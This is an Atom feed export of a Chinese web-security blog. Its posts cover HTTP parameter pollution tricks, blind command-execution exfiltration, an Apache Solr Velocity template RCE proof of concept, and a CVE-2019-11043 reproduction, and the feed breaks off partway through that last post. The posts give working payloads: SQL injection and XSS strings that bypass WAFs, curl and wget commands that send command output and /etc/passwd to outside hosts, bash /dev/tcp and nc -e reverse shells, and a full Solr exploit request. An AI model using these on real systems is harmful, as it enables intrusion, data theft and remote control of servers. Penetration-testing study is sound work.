<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>VK&#39;s blog</title>
  
  <subtitle>VK&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.vkxss.top/"/>
  <updated>2019-11-10T14:44:59.594Z</updated>
  <id>http://www.vkxss.top/</id>
  
  <author>
    <name>VK</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>参数污染漏洞（HPP）挖掘技巧</title>
    <link href="http://www.vkxss.top/2019/11/09/%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%EF%BC%88HPP%EF%BC%89%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/"/>
    <id>http://www.vkxss.top/2019/11/09/参数污染漏洞（HPP）挖掘技巧/</id>
    <published>2019-11-09T07:30:08.000Z</published>
    <updated>2019-11-10T14:44:59.594Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#参数污染漏洞hpp挖掘技巧记录">参数污染漏洞（HPP）挖掘技巧记录</a><ul><li><a href="#概念">概念：</a></li><li><a href="#漏洞原理">漏洞原理：</a></li><li><a href="#实战案例总结">实战案例总结：</a></li><li><a href="#挖掘技巧">挖掘技巧：</a></li><li><a href="#修复方案">修复方案：</a></li></ul></li></ul><!-- tocstop --><h2><span id="参数污染漏洞hpp挖掘技巧记录">参数污染漏洞（HPP）挖掘技巧记录</span></h2><h3><span id="概念">概念：</span></h3><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p><h3><span id="漏洞原理">漏洞原理：</span></h3><ul><li><p>通过简单的案例可以说明这种处理的差异：</p></li><li><p>在不同的搜索引擎中进行搜索，在地址栏输入URL：/s?wd=test&amp;wd=test1，这里重复相同搜索参数，观察搜索结果的不同：</p><ul><li><p>(1)百度接受第一个参数（test）而放弃第二个参数（test1）：<br><a href="https://imgchr.com/i/MKcQJA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MKcQJA.jpg" alt="MKcQJA.jpg"></a></p></li><li><p>(2)Yahho接受第二个参数（test1）而放弃第一个参数（test）：</p></li><li><p>(3)Google会将两个值都接受，并通过一个空格将两个参数连接起来，组成一个参数：</p></li></ul></li><li><p>测试不同服务器对漏洞的处理方法：</p><ul><li><p>对于Flask服务器，取第一个值</p></li><li><p>对于PHP/Apache服务器，取最后一个值<br>我们以弹窗为例，首先将js代码放在first参数name位置，返回string(3) “222” ，证明取的是最后一个name参数的值。<br><a href="https://imgchr.com/i/MKc1zt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MKc1zt.jpg" alt="MKc1zt.jpg"></a><br><a href="https://imgchr.com/i/MKclRI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MKclRI.jpg" alt="MKclRI.jpg"></a></p></li><li><p>具体服务端对应的不同处理方式如下<br><a href="https://imgchr.com/i/MKcMid" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MKcMid.jpg" alt="MKcMid.jpg"></a></p></li></ul></li></ul><h3><span id="实战案例总结">实战案例总结：</span></h3><ul><li><p>HPP漏洞的产生原因一方面来自服务器处理机制的不同，另一方面来自开发人员后端检测逻辑的问题。HTTP 参数污染的风险实际上取决于后端所执行的操作，以及被污染的参数提交到了哪里。总体上HPP一般有两种利用场景：</p><ul><li>1）逻辑漏洞，通常会造成IDOR，信息泄露，越权等漏洞;</li></ul><ul><li>2）作为其他漏洞的辅助，用于绕过漏洞的检测和Waf等。</li></ul></li></ul><ul><li><p>这里汇总了工作中和国内外遇到的一些典型案例：</p></li><li><p>1、 逻辑漏洞（IDOR）</p><ul><li><p>1）敏感操作</p><ul><li>SilverlightFox中，网站通过URL：<a href="https://www.example.com/transferMoney.php?amount=1000&amp;fromAccount=12345进行转账操作，原本链接中是没有toAmount参数的，这个参数是后端固定的，但如果我们重复提交这个参数：toAccount=9876&amp;amount=1000&amp;fromAccount=12345&amp;toAccount=99999第二个" target="_blank" rel="noopener">https://www.example.com/transferMoney.php?amount=1000&amp;fromAccount=12345进行转账操作，原本链接中是没有toAmount参数的，这个参数是后端固定的，但如果我们重复提交这个参数：toAccount=9876&amp;amount=1000&amp;fromAccount=12345&amp;toAccount=99999第二个</a> toAccount 参数，会覆盖后端请求，并将钱转账给恶意账户（ 99999 ）而不是由系统设置的预期账户（ 9876 ）。</li></ul></li><li><p>(2）IDOR（不安全的对象引用）</p><ul><li>一般的社交软件都有“关注”或”喜欢”功能，下面就是ID为5318415对5333003进行关注发送的数据包：</li><li>按我们通常挖掘逻辑漏洞的思路，我们可以篡改ID值，使对方关注我。这里5318415是我的ID，但将我的actorId替换为对方的ID，会收到“401 Unauthorized”错误，说明此处做了鉴权操作。</li><li>但是，如果请求2个actorId参数，第一个actorId参数是目标的actorId。这样5024700（受害者）会关注5318415（我）。这次得到的响应是202 Accepted。</li><li>后台对于actorId的鉴权操作是对第二个，关注操作取的却是第一个。所以在测试越权类问题时未果不妨多试一步HPP，下面Twitter案例也是如出一辙：<a href="https://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26" target="_blank" rel="noopener">https://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26</a></li><li>通过添加第二个uid，取消Twitter的邮箱提醒。</li></ul></li><li><p>3）社交分享链接</p><ul><li>不少网站都有社交分享按钮，可以把内容分享到其他社交媒体，如Hackerone的链接为：<a href="https://hackerone.com/blog/introducing-signal，分享到FB上链接为：" target="_blank" rel="noopener">https://hackerone.com/blog/introducing-signal，分享到FB上链接为：</a></li><li><a href="https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal" target="_blank" rel="noopener">https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal</a></li><li>如果我们将要分享的Hackerone的链接改为：<a href="https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov，则最终的跳转会成为：" target="_blank" rel="noopener">https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov，则最终的跳转会成为：</a></li><li><a href="https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov" target="_blank" rel="noopener">https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov</a></li><li>后一个参数u拥有比第一个更高的优先级，之后会用于 Fackbook 的发布，最终会跳转到恶意站点<a href="https://vk.com/durov。" target="_blank" rel="noopener">https://vk.com/durov。</a></li></ul></li><li><p>4）页面跳转</p><ul><li>一个Digits跳转的案例，跳转链接如下：</li><li><a href="https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv" target="_blank" rel="noopener">https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv</a></li><li>如果直接修改参数为<a href="http://attacker.com，由于注册域不匹配，因此页面将显示错误，但如果我们使用HPP：" target="_blank" rel="noopener">http://attacker.com，由于注册域不匹配，因此页面将显示错误，但如果我们使用HPP：</a></li><li><a href="https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv&amp;host=http://attacker.com" target="_blank" rel="noopener">https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv&amp;host=http://attacker.com</a></li><li>从而第一个host参数绕过验证，取第二个host参数作为跳转源。</li></ul></li><li><p>5）权限操作</p><ul><li><p>以下代码：</p><p><code>&lt;? $val=htmlspecialchars($_GET[&#39;par&#39;],ENT_QUOTES); ?&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 以下代码使用par参数取用户输入并生成URL：</span><br><span class="line">- http://host/page.php?action=view&amp;par=123</span><br><span class="line">- 但用户若输入par为则最终生成的链接为：123&amp;amp;action=edit，则最终的请求则变成：</span><br><span class="line">- http://host/page.php?action=view&amp;par=123&amp;amp;action=edit</span><br><span class="line">- 通过重复提交action参数，会导致应用接受编辑操作而不是查看操作，实现权限的提升。</span><br><span class="line"></span><br><span class="line">- 注：&apos;&amp;amp;&apos; = &apos;&amp;&apos; ，在HTML中的&amp;用&amp;amp; 来表示</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p>2、 绕过检测（WAF）</p><ul><li><p>1）SQL绕过1</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 一个常见的SQL注入payload如:</span><br><span class="line">- http://xxx/horse.php?id=7 union select 1,2,3，current_user</span><br><span class="line">- 探测发现网站配置了WAF来阻止任意包含“select”或“union”等常用的SQL查询关键字，通过HPP绕过：</span><br><span class="line">- http://xxx/horse.php?id=0&amp;amp;id=7%20union%20select%201,2,3,current_user</span><br><span class="line">- 注入语句被写到第二个参数值的位置，不会被waf解析。</span><br></pre></td></tr></table></figure></li><li><p>2）SQL绕过2</p><ul><li>ModSecurity过滤器会将类似于select1,2,3 from table这类的语句归类为黑名单。但是这个web服务器在遇到为同一个参数赋值不同数值时，会采取类似谷歌的处理方式，将参数连接起来，以此来绕过黑名单。例如提交如下的URL：</li><li><a href="http://xxx/index.aspx?page=select" target="_blank" rel="noopener">http://xxx/index.aspx?page=select</a> 1&amp;page=2,3 from table</li></ul></li><li><p>3）Apple Cups的XSS</p><ul><li>Apple Cups是被许多UNIX系统利用的打印系统。系统对kerberos进行了黑名单过滤，通过前置一个重复参数可以触发xss：</li><li><a href="http://xxx/?kerberos=onmouseover=alert(1)&amp;kerberos=" target="_blank" rel="noopener">http://xxx/?kerberos=onmouseover=alert(1)&amp;kerberos=</a></li><li>这个方法可以绕过系统的验证机制，原因是这个验证系统只采纳了第二个kerberos的值，这个值为空，因此不会触发。而第一个kerberos直到被用于构建动态HTML内容前都没有被验证。最终在web站点的上下文中javascript语句被执行。</li></ul></li><li><p>4）URL重定向+HPP+XSS</p><ul><li>在点击网站的链接时，会将用户重定向到一个页面，链接为：</li><li>xxx.aspx?dest=<a href="http://whitelistedWebsite.com" target="_blank" rel="noopener">http://whitelistedWebsite.com</a></li><li>这容易想到URL重定向漏洞，经过探测，发现dest参数接受的协议有http:// ftp:// http:/ javascript:/，所以尝试构造xss：</li><li>dest=javascript://alert(document.domain)</li><li>发现存在白名单限制，尝试绕过：</li><li>dest=javascript:/whitelistedWebsite.com/i;alert(document.domain</li><li>但分号；会无法解析，导致报错，最终使用HPP绕过：</li><li>dest=javascript:/whitelistedWebsite.com/i&amp;dest=alert(1)</li><li>原理和例1类似，接受两个参数值进行拼接：javascript://alert(1)</li></ul></li></ul></li></ul><h3><span id="挖掘技巧">挖掘技巧：</span></h3><ul><li><p>根据上面的实战案例总结，在挖掘HPP漏洞的时候，需要注意以下几点：</p><ul><li><p>1、和IDOR漏洞挖掘类似，关注与用户权限紧密相关的参数，有些场景可能防范了IDOR，但重复提交参数可能就会产生奇效；</p></li><li><p>2、在挖掘其他漏洞的时候，如果进行了检测又无法绕过的情况下，可以尝试通过重复提交参数/参数拼接方式绕过检测。</p></li></ul></li></ul><h3><span id="修复方案">修复方案：</span></h3><ul><li><p>概括地讲，防范这类攻击的方法有两种：</p><ul><li><p>1、设备层面，让WAF或其他网关设备（比如IPS）在检查URL时，对同一个参数被多次赋值的情况进行特殊处理。由于HTTP协议允许相同参数在URL中多次出现，因此这种特殊处理需要注意避免误杀的情况；</p></li><li><p>2、代码层面，编写WEB程序时，要通过合理的$_GET方法获取URL中的参数值，而尝试获取web服务器返回给程序的其他值时要慎重处理，结合其他漏洞的产生进行组合排查。</p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#参数污染漏洞hpp挖掘技巧记录&quot;&gt;参数污染漏洞（HPP）挖掘技巧记录&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#概念&quot;&gt;概念：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#漏洞原理&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>无回显代码执行利用方法总结</title>
    <link href="http://www.vkxss.top/2019/11/08/%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://www.vkxss.top/2019/11/08/无回显代码执行利用方法总结/</id>
    <published>2019-11-08T07:30:08.000Z</published>
    <updated>2019-11-10T04:54:57.610Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-dnslog回显">0X00 DNSLOG回显</a></li><li><a href="#0x01-curl上传文件">0X01 curl上传文件</a></li><li><a href="#0x02-wget">0X02 Wget</a></li><li><a href="#0x03-反弹shell">0X03 反弹shell</a></li></ul><!-- tocstop --><h2><span id="0x00-dnslog回显">0X00 DNSLOG回显</span></h2><ul><li><p>尝试DNSLOG获取回显使用反引号执行代码，并用curl将执行结果返回给DNSLOG</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://dnslog/`whoami`</span><br><span class="line">ping `whoami`.dnslog</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MZp6f0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZp6f0.jpg" alt="MZp6f0.jpg"></a><br>  <a href="https://imgchr.com/i/MZpDTs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpDTs.jpg" alt="MZpDTs.jpg"></a></p></li></ul><h2><span id="0x01-curl上传文件">0X01 curl上传文件</span></h2><ul><li><p>我们可以用 -X POST 来申明我们的请求方法，用 -F “file=@<strong>FILE_PATH</strong>“ 的请示，传输文件即可。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 利用Burp：</span><br><span class="line">curl -X POST -F xx=@/Users/vk/Downloads/1.txt http://a8jmrauzh2kxy56bhk99xwhh78dy1n.burpcollaborator.net -v</span><br><span class="line"></span><br><span class="line"># 利用NC：</span><br><span class="line">curl -X POST -F xx=@/Users/vk/Downloads/1.txt http://127.0.0.1:9999 -v</span><br></pre></td></tr></table></figure></li><li><p>打开Burp主界面 –&gt;菜单（Burp）–&gt;Burp Collaboraor Client – &gt; 点击 Copy to Clipboard<br>  <a href="https://imgchr.com/i/MZp2lT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZp2lT.jpg" alt="MZp2lT.jpg"></a><br>  <a href="https://imgchr.com/i/MZpR6U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpR6U.jpg" alt="MZpR6U.jpg"></a></p></li></ul><h2><span id="0x02-wget">0X02 Wget</span></h2><ul><li><p>wget指定header头查看日志回显</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -d --header=&quot;User-Agent: $(cat /etc/passwd|tail -n 1)&quot; http://127.0.0.1/1.php</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MuAZ4O" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MuAZ4O.jpg" alt="MuAZ4O.jpg"></a><br>  <a href="https://imgchr.com/i/MuAVUK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MuAVUK.jpg" alt="MuAVUK.jpg"></a></p></li></ul><h2><span id="0x03-反弹shell">0X03 反弹shell</span></h2><ul><li><p>用nc返回一个交互式的shell</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 服务器端执行</span><br><span class="line">nc -vv -lp 8888</span><br><span class="line"></span><br><span class="line"># 命令执行处执行</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"># payload</span><br><span class="line">command=111%0d%0abash+-i+&gt;%26+/dev/tcp/127.0.0.1/8888+0&gt;%261</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MZpyYq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpyYq.jpg" alt="MZpyYq.jpg"></a><br>  <a href="https://imgchr.com/i/MZpskn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpskn.jpg" alt="MZpskn.jpg"></a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-dnslog回显&quot;&gt;0X00 DNSLOG回显&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-curl上传文件&quot;&gt;0X01 curl上传文件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x0
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Apache_Solr_Velocity模板注入RCE漏洞</title>
    <link href="http://www.vkxss.top/2019/10/31/Apache_Solr_Velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.vkxss.top/2019/10/31/Apache_Solr_Velocity模板注入RCE漏洞/</id>
    <published>2019-10-31T07:30:08.000Z</published>
    <updated>2019-11-01T03:31:26.517Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-前言">0x00 前言</a></li><li><a href="#0x01-漏洞详情">0x01 漏洞详情</a></li><li><a href="#0x02-poc">0x02 POC</a></li><li><a href="#0x03-复现">0x03 复现</a></li></ul><!-- tocstop --><h2><span id="0x00-前言">0x00 前言</span></h2><ul><li><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p></li><li><p>r是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p></li></ul><h2><span id="0x01-漏洞详情">0x01 漏洞详情</span></h2><ul><li>该漏洞的产生原因：<ul><li>1、攻击者可以直接访问solr admin页面,并可以通过构造post请求来修改节点的配置.</li><li>2.Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。</li><li>3、当params.resource.loader.enabled设置为true，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个恶意的请求，在服务器上进行命令执行,从而获取服务器的权限。</li></ul></li></ul><h2><span id="0x02-poc">0x02 POC</span></h2><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">来自：https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt </span><br><span class="line"></span><br><span class="line">Apache Solr RCE via Velocity template</span><br><span class="line"></span><br><span class="line">Set &quot;params.resource.loader.enabled&quot; as true.</span><br><span class="line"></span><br><span class="line">Request:</span><br><span class="line">========================================================================</span><br><span class="line">POST /solr/test/config HTTP/1.1</span><br><span class="line">Host: solr:8983</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RCE via velocity template</span><br><span class="line">Request:</span><br><span class="line">========================================================================</span><br><span class="line">GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1</span><br><span class="line">Host: localhost:8983</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Response:</span><br><span class="line">========================================================================</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)</span><br><span class="line">========================================================================</span><br></pre></td></tr></table></figure></code></pre><h2><span id="0x03-复现">0x03 复现</span></h2><ul><li><p>环境搭建</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下载最新的Solr</span><br><span class="line">下载地址:https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip</span><br><span class="line">解压以后,进入solr-8.2.0/bin目录</span><br><span class="line">使用./solr -e dih -force开启示例app</span><br></pre></td></tr></table></figure><p> <a href="https://imgchr.com/i/K7nKL4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nKL4.md.jpg" alt="K7nKL4.md.jpg"></a></p></li><li><p>payload:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br><span class="line">注意：漏洞需要Content-Type为application/json</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/K7nuyF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nuyF.md.jpg" alt="K7nuyF.md.jpg"></a></p></li><li><p>反弹shell：</p><ul><li>可以反弹shell，使用nc命令：<br><a href="https://imgchr.com/i/K7nnQU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nnQU.md.jpg" alt="K7nnQU.md.jpg"></a></li></ul><ul><li>nc -e /bin/bash ip port成功反弹shell<br><a href="https://imgchr.com/i/K7nezT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nezT.md.jpg" alt="K7nezT.md.jpg"></a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-前言&quot;&gt;0x00 前言&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-漏洞详情&quot;&gt;0x01 漏洞详情&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-poc&quot;&gt;0x02 POC&lt;/a&gt;&lt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-11043-PHP远程代码执行漏洞复现</title>
    <link href="http://www.vkxss.top/2019/10/25/CVE-2019-11043/"/>
    <id>http://www.vkxss.top/2019/10/25/CVE-2019-11043/</id>
    <published>2019-10-25T07:30:08.000Z</published>
    <updated>2019-11-01T05:22:25.327Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-简介">0X00 简介</a></li><li><a href="#0x01-cve编号">0X01 CVE编号</a></li><li><a href="#0x02-漏洞威胁等级">0X02 漏洞威胁等级</a></li><li><a href="#0x03-影响范围">0X03 影响范围</a></li><li><a href="#0x04-漏洞复现">0X04 漏洞复现</a></li><li><a href="#0x05-漏洞总结">0X05 漏洞总结</a></li><li><a href="#0x06-reference">0X06 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-简介">0X00 简介</span></h2><ul><li>9 月 26 日，安全研究员 Andrew Danau向PHP 提交一枚远程代码执行漏洞，使用某些特定配置的Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。该漏洞EXP于10月22日公开。<br>原因是：Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。</li></ul><h2><span id="0x01-cve编号">0X01 CVE编号</span></h2><ul><li>CVE-2019-11043</li></ul><h2><span id="0x02-漏洞威胁等级">0X02 漏洞威胁等级</span></h2><ul><li>高危</li></ul><h2><span id="0x03-影响范围">0X03 影响范围</span></h2><ul><li><p>Nginx+ php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">        fastcgi_split_path_info^(.+?\.php)(/.*)$;</span><br><span class="line">        fastcgi_param PATH_INFO       $fastcgi_path_info;</span><br><span class="line">        fastcgi_pass   php:9000;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="0x04-漏洞复现">0X04 漏洞复现</span></h2><ul><li><p>在EXP公布的时候，vulhub也发布了相应的镜像，本次实验使用该镜像进行复现。</p><ul><li><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043</a></li></ul></li><li><p>将文件下载下来之后，搭建环境:</p><ul><li>docker-compose up -d</li></ul></li><li><p>Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。<br><img src="https://s2.ax1x.com/2019/11/01/K7rsNn.jpg" alt="K7rsNn.jpg"></p></li><li><p>详情参考Reference</p></li></ul><h2><span id="0x05-漏洞总结">0X05 